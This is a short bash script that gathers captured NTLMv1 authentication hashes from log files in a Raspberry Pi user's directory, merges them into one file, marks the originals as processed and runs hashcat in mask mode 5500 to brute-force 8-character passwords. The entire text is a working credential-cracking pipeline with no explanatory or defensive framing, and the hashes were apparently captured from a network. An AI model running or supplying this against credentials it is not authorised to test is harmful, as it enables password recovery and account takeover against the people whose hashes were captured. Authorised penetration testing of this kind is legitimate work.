#!/bin/bash

HASHDIR=/home/raspi/pilogs
OUTFILE=NTLMv1-hashes-$(date +%m%d%y%H%M)

for file in $HASHDIR/*NTLMv1*.txt
    do
    cat $file >> $OUTFILE
    mv $file $HASHDIR/$(basename $file .txt).processed
done

/root/Downloads/hashcat-3.00/hashcat64.bin -a 3 -i -m 5500 --increment-min=8 --increment-max=8 $OUTFILE
